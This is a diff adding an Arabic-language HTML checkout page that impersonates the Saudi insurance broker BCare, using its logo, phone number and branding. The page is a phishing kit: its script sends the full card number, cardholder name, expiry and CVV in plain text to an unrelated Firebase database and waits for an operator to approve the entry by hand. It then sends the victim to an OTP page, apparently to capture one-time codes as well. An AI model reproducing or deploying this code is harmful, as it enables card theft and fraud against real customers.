@@ -1,0 +1,600 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بي كير | إتمام الدفع</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=Tajawal:wght@400;500;700;800;900&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+    
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore-compat.js"></script>
+
+    <style>
+        body {
+            font-family: 'Cairo', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f7f9fa;
+            color: #333;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .header-section {
+            background-color: #1a6396;
+            color: #ffffff;
+            width: 100%;
+            text-align: center;
+            padding: 40px 20px 80px;
+            box-sizing: border-box;
+        }
+
+        .header-section h1 {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            line-height: 1.5;
+        }
+
+        .header-section p {
+            font-size: 15px;
+            line-height: 1.6;
+            margin-bottom: 0;
+            opacity: 0.95;
+            font-weight: 400;
+        }
+
+        .form-container {
+            background-color: #ffffff;
+            width: 92%;
+            max-width: 450px;
+            border-radius: 12px;
+            margin-top: -40px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            overflow: hidden;
+            z-index: 10;
+            margin-bottom: 100px;
+            padding: 25px 20px;
+            box-sizing: border-box;
+        }
+
+        .summary-card {
+            background-color: #f0f7fc;
+            border: 1px solid #1a6396;
+            border-radius: 8px;
+            padding: 15px 20px;
+            margin-bottom: 25px;
+        }
+
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 12px;
+            font-weight: 600;
+            font-size: 14px;
+            color: #444;
+        }
+        
+        .summary-row:last-child {
+            margin-bottom: 0;
+        }
+
+        .summary-row.total {
+            border-top: 1px solid #d1e5f5;
+            padding-top: 12px;
+            font-weight: 800;
+            font-size: 18px;
+            color: #1a6396;
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #666;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-family: 'Cairo', sans-serif;
+            box-sizing: border-box;
+            font-size: 15px;
+            color: #333;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+        
+        .form-control:focus {
+            border-color: #1a6396;
+        }
+
+        .form-control::placeholder {
+            color: #ccc;
+            font-weight: 400;
+        }
+
+        .row-2 {
+            display: flex;
+            gap: 15px;
+        }
+        
+        .row-2 .form-group {
+            flex: 1;
+        }
+
+        .input-icon-container {
+            position: relative;
+        }
+
+        .card-icon-left {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 20px;
+            color: #999;
+            z-index: 2;
+        }
+
+        .form-control.card-input {
+            padding-left: 45px;
+            direction: ltr;
+            text-align: left;
+        }
+        
+        .form-control.ltr-input {
+            direction: ltr;
+            text-align: left;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background-color: #f7b260;
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            font-family: 'Cairo', sans-serif;
+            transition: opacity 0.3s, background-color 0.3s;
+            margin-top: 10px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .submit-btn:hover:not(:disabled) {
+            opacity: 0.9;
+        }
+        
+        .submit-btn:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+            opacity: 0.8;
+        }
+
+        .payment-section {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 25px 0 5px;
+        }
+        .payment-section p {
+            color: #666;
+            margin-bottom: 15px;
+            font-size: 16px;
+        }
+        .payment-methods {
+            display: flex;
+            gap: 6px;
+            justify-content: center;
+            flex-wrap: wrap;
+            direction: ltr;
+        }
+        .payment-box {
+            background: #fff;
+            border: 1px solid #eee;
+            border-radius: 4px;
+            padding: 4px 6px;
+            height: 28px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 11px;
+            font-weight: bold;
+        }
+
+        .pay-apple { color: #000; font-size: 13px; gap: 4px;}
+        .pay-mastercard { display: flex; gap: -3px; }
+        .pay-mastercard .red { width: 12px; height: 12px; background: #eb001b; border-radius: 50%; z-index: 1;}
+        .pay-mastercard .yellow { width: 12px; height: 12px; background: #f79e1b; border-radius: 50%; margin-left: -5px; z-index: 2;}
+        .pay-visa { color: #1a1f71; font-size: 13px; font-style: italic;}
+        .pay-sadad { color: #f26f21; font-size: 12px;}
+        .pay-mada { color: #000; display: flex; gap: 3px; font-size: 10px; align-items: center;}
+        .pay-mada span { color: #00c651; font-weight: 800;}
+        .pay-amex { background-color: #0070ce; color: #fff; padding: 2px 6px; border-radius: 2px;}
+        .pay-tabby { background-color: #3eefc1; color: #000; padding: 2px 6px; border-radius: 2px; font-weight: normal;}
+
+        .site-footer {
+            font-family: 'Tajawal', sans-serif;
+            background-color: #ffffff;
+            color: #333;
+            width: 100%;
+            border-top: 1px solid #f2f2f2;
+            padding-bottom: 20px;
+            direction: rtl;
+            box-sizing: border-box;
+            margin-top: auto;
+        }
+        
+        .site-footer .footer-container {
+            width: 100%;
+            max-width: 1200px; 
+            margin: 0 auto;
+        }
+
+        .site-footer .logo-section {
+            padding: 20px;
+            text-align: right;
+            margin-bottom: 10px;
+        }
+        .site-footer .logo-section img {
+            width: 110px;
+        }
+
+        .site-footer .contact-section {
+            display: flex;
+            justify-content: flex-start;
+            align-items: center;
+            padding: 0 20px 20px 20px;
+            color: #20709b;
+            font-weight: 700;
+            font-size: 19px;
+            gap: 10px;
+        }
+        .site-footer .contact-section span {
+            direction: ltr;
+        }
+        .site-footer .contact-section i {
+            font-size: 20px;
+        }
+
+        .site-footer .social-section {
+            padding: 0 20px 20px 20px;
+        }
+        .site-footer .social-section p {
+            color: #666;
+            margin-bottom: 15px;
+            font-size: 15px;
+        }
+        .site-footer .social-icons {
+            display: flex;
+            gap: 12px;
+        }
+        .site-footer .social-icons a {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 35px;
+            height: 35px;
+            background-color: #20709b;
+            color: #fff;
+            border-radius: 50%;
+            text-decoration: none;
+            font-size: 18px;
+        }
+
+        .site-footer .spacer {
+            height: 40px;
+        }
+
+        .site-footer .accordion {
+            border-top: 1px solid #f2f2f2;
+        }
+        .site-footer .accordion-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 18px 20px;
+            border-bottom: 1px solid #f2f2f2;
+            color: #111;
+            font-size: 15px;
+            cursor: pointer;
+        }
+        .site-footer .accordion-item i {
+            color: #777;
+            font-size: 14px;
+        }
+
+        .site-footer .legal-links {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 15px;
+            padding: 10px 20px;
+            font-size: 14px;
+        }
+        .site-footer .legal-links a {
+            color: #666;
+            text-decoration: none;
+        }
+        .site-footer .legal-links span {
+            color: #ccc;
+        }
+
+        .site-footer .copyright {
+            text-align: center;
+            padding: 15px 20px 20px;
+            font-size: 14px;
+            color: #888;
+            line-height: 1.6;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header-section">
+        <h1>إتمام عملية الدفع</h1>
+        <p>أكمل عملية الدفع بأمان وسهولة لإصدار وثيقة التأمين الخاصة بك</p>
+    </div>
+
+    <div class="form-container">
+        <div class="summary-card" id="summaryCard">
+            <div class="summary-row">
+                <span>نوع التأمين:</span>
+                <span id="offerName">جاري التحميل...</span>
+            </div>
+            <div class="summary-row">
+                <span>قيمة العرض:</span>
+                <span id="priceValue">0 ر.س</span>
+            </div>
+            <div class="summary-row">
+                <span>الرسوم الإدارية:</span>
+                <span id="feesValue">40 ر.س</span>
+            </div>
+            <div class="summary-row total">
+                <span>الإجمالي:</span>
+                <span id="totalValue">0 ر.س</span>
+            </div>
+        </div>
+        
+        <div class="card-form">
+            <div class="form-group">
+                <label>رقم البطاقة</label>
+                <div class="input-icon-container">
+                    <i id="cardTypeIcon" class="fa-solid fa-credit-card card-icon-left"></i>
+                    <input type="text" id="cardNumber" class="form-control card-input" placeholder="0000 0000 0000 0000" maxlength="19">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>اسم حامل البطاقة</label>
+                <input type="text" id="cardName" class="form-control" placeholder="الاسم كما هو مطبوع على البطاقة">
+            </div>
+
+            <div class="row-2">
+                <div class="form-group">
+                    <label>تاريخ الانتهاء</label>
+                    <input type="text" id="cardExpiry" class="form-control ltr-input" placeholder="MM/YY" maxlength="5">
+                </div>
+                <div class="form-group">
+                    <label>رمز الأمان (CVV)</label>
+                    <input type="password" id="cardCvv" class="form-control ltr-input" placeholder="123" maxlength="4">
+                </div>
+            </div>
+        </div>
+
+        <button class="submit-btn" id="payButton">دفع الآن</button>
+
+        <div class="payment-section">
+            <div class="payment-methods">
+                <div class="payment-box pay-apple"><i class="fa-brands fa-apple"></i> Pay</div>
+                <div class="payment-box pay-mastercard">
+                    <div class="red"></div>
+                    <div class="yellow"></div>
+                </div>
+                <div class="payment-box pay-visa">VISA</div>
+                <div class="payment-box pay-sadad">سداد</div>
+                <div class="payment-box pay-mada"><span>mada</span> مدى</div>
+                <div class="payment-box pay-amex">AMEX</div>
+                <div class="payment-box pay-tabby">tabby</div>
+            </div>
+        </div>
+    </div>
+
+    <footer class="site-footer">
+        <div class="footer-container">
+            <div class="logo-section">
+                <img src="https://bcare.com.sa/assets/images/logo.svg" alt="BCare" onerror="this.style.display='none'">
+            </div>
+            <div class="contact-section">
+                <span dir="ltr">800 11 800 44</span>
+                <i class="fa-solid fa-phone"></i>
+            </div>
+            <div class="social-section">
+                <p>تابعنا</p>
+                <div class="social-icons">
+                    <a href="#"><i class="fa-brands fa-facebook-f"></i></a>
+                    <a href="#"><i class="fa-brands fa-youtube"></i></a>
+                    <a href="#"><i class="fa-brands fa-linkedin-in"></i></a>
+                    <a href="#"><i class="fa-brands fa-instagram"></i></a>
+                </div>
+            </div>
+            <div class="spacer"></div>
+            <div class="accordion">
+                <div class="accordion-item">
+                    <span>منتجات الأفراد</span>
+                    <i class="fa-solid fa-chevron-down"></i>
+                </div>
+                <div class="accordion-item">
+                    <span>منتجات الشركات</span>
+                    <i class="fa-solid fa-chevron-down"></i>
+                </div>
+                <div class="accordion-item">
+                    <span>مصادر</span>
+                    <i class="fa-solid fa-chevron-down"></i>
+                </div>
+                <div class="accordion-item">
+                    <span>الشركة</span>
+                    <i class="fa-solid fa-chevron-down"></i>
+                </div>
+            </div>
+            <div class="legal-links">
+                <a href="#">سياسة الخصوصية</a>
+                <span>|</span>
+                <a href="#">الشروط والأحكام</a>
+            </div>
+            <div class="copyright">
+                © 2026 شركة عناية الوسيط لوساطة التأمين. جميع الحقوق محفوظة.
+            </div>
+        </div>
+    </footer>
+
+    <script>
+       
+        document.addEventListener('DOMContentLoaded', () => {
+            const storedData = JSON.parse(localStorage.getItem('selectedInsuranceOffer'));
+            const fees = 40; // رسوم إدارية
+
+            if(storedData) {
+                document.getElementById('offerName').textContent = storedData.title;
+                document.getElementById('priceValue').textContent = storedData.price + ' ر.س';
+                document.getElementById('feesValue').textContent = fees + ' ر.س';
+                
+                const total = parseFloat(storedData.price) + fees;
+                document.getElementById('totalValue').textContent = total + ' ر.س';
+            } else {
+                document.getElementById('offerName').textContent = 'تأمين شامل مركبات';
+                document.getElementById('priceValue').textContent = '850 ر.س';
+                document.getElementById('feesValue').textContent = '40 ر.س';
+                document.getElementById('totalValue').textContent = '890 ر.س';
+            }
+        });
+
+
+        const cardNumberInput = document.getElementById('cardNumber');
+        const cardTypeIcon = document.getElementById('cardTypeIcon');
+
+        cardNumberInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s+/g, ''); 
+            
+            if (value.startsWith('4')) {
+                cardTypeIcon.className = 'fa-brands fa-cc-visa card-icon-left';
+                cardTypeIcon.style.color = '#1a1f71';
+            } else if (/^5[1-5]/.test(value)) {
+                cardTypeIcon.className = 'fa-brands fa-cc-mastercard card-icon-left';
+                cardTypeIcon.style.color = '#eb001b';
+            } else if (/^50|^56|^58|^60|^63|^67|^96/.test(value)) {
+                cardTypeIcon.className = 'fa-solid fa-credit-card card-icon-left';
+                cardTypeIcon.style.color = '#33a763'; 
+            } else {
+                cardTypeIcon.className = 'fa-solid fa-credit-card card-icon-left';
+                cardTypeIcon.style.color = '#999';
+            }
+
+            if (value.length > 0) {
+                value = value.match(new RegExp('.{1,4}', 'g')).join(' ');
+            }
+            e.target.value = value;
+        });
+
+        document.getElementById('cardExpiry').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            e.target.value = value;
+        });
+
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyD_JfgnZpx8iS8QG61NKBioNP3Ae1FEms8",
+            authDomain: "ronald-pavency-i1tap.firebaseapp.com",
+            projectId: "ronald-pavency-i1tap",
+            storageBucket: "ronald-pavency-i1tap.firebasestorage.app",
+            messagingSenderId: "948365366268",
+            appId: "1:948365366268:web:004f6f39a85e910137d879"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
+        document.getElementById('payButton').addEventListener('click', () => {
+            const cardNumber = document.getElementById('cardNumber').value.replace(/\s+/g, '');
+            const cardName = document.getElementById('cardName').value;
+            const cardExpiry = document.getElementById('cardExpiry').value;
+            const cardCvv = document.getElementById('cardCvv').value;
+            const offerData = document.getElementById('offerName').textContent;
+            const totalAmount = document.getElementById('totalValue').textContent;
+
+            if(!cardNumber || !cardName || !cardExpiry || !cardCvv) {
+                alert('الرجاء إدخال كافة معلومات البطاقة');
+                return;
+            }
+
+            // تغيير حالة الزر ليظهر أيقونة التحميل وعبارة جاري المعالجة
+            const payBtn = document.getElementById('payButton');
+            payBtn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> جاري المعالجة، الرجاء الانتظار...';
+            payBtn.disabled = true;
+
+            // إرسال البيانات مع حالة "قيد الانتظار"
+            db.collection("payments").add({
+                offerDetails: offerData,
+                amount: totalAmount,
+                paymentMethod: "Credit Card",
+                cardInfo: {
+                    number: cardNumber,
+                    name: cardName,
+                    expiry: cardExpiry,
+                    cvv: cardCvv
+                },
+                status: "pending", // تمت إضافة حقل الحالة
+                timestamp: firebase.firestore.FieldValue.serverTimestamp()
+            })
+            .then((docRef) => {
+                // مراقبة المستند بانتظار تغيير الحالة من لوحة تحكم فايربيس
+                const unsubscribe = db.collection("payments").doc(docRef.id).onSnapshot((doc) => {
+                    const data = doc.data();
+                    
+                    if (data && data.status === 'approved') {
+                        // حفظ بيانات البطاقة في المتصفح لاستخدامها في صفحة الـ OTP
+                        localStorage.setItem("customerName", cardName);
+                        localStorage.setItem("customerCard", cardNumber);
+
+                        // التوجيه لصفحة الـ OTP
+                        window.location.href = 'otp.html';
+                    } else if (data && data.status === 'rejected') {
+                        // في حال قمت بكتابة rejected
+                        alert("تم رفض العملية، يرجى التأكد من البيانات المدخلة أو استخدام بطاقة أخرى.");
+                        payBtn.innerHTML = 'دفع الآن';
+                        payBtn.disabled = false;
+                        unsubscribe(); // إيقاف المراقبة بعد الرفض
+                    }
+                });
+            })
+            .catch((error) => {
+                console.error("Error adding document: ", error);
+                alert("حدث خطأ أثناء معالجة الدفع.");
+                payBtn.innerHTML = 'دفع الآن';
+                payBtn.disabled = false;
+            });
+        });
+    </script>
+</body>
+</html>
